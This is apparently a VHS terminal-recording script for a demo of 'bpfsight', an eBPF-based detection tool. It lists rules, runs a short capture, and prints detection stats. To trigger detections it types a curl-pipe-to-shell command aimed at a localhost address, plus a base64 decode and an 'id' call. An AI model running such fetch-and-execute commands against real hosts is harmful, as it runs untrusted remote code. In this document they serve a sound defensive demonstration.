# Full demo: rule inventory, a live capture with detections printing inline,
# and the stats summary afterwards.
Set Width 1360
Set Height 720
Set Theme "Dracula"
Set FontSize 13
Set TypingSpeed 6ms
Set MarginFill "#101418"
Set Margin 24
Type "DB=/tmp/demo-run.sqlite; sudo -n rm -f $DB $DB-wal $DB-shm || true"
Enter
Sleep 500ms
Type "sudo -n target/release/bpfsight rules"
Enter
Sleep 2200ms
Type "sudo -n target/release/bpfsight run --db $DB --rules-dir rules --duration 6 &"
Enter
Sleep 1500ms
Type "bash -c 'curl -s http://127.0.0.1:1/x | sh' 2>/dev/null; echo QQ | base64 -d >/dev/null 2>&1; id >/dev/null"
Enter
Sleep 1200ms
Type "python3 tools/demo-connect.py"
Enter
Sleep 5500ms
Type "wait"
Enter
Sleep 1000ms
Type "target/release/bpfsight stats --db $DB"
Enter
Sleep 2000ms
Output "assets/demo.gif"
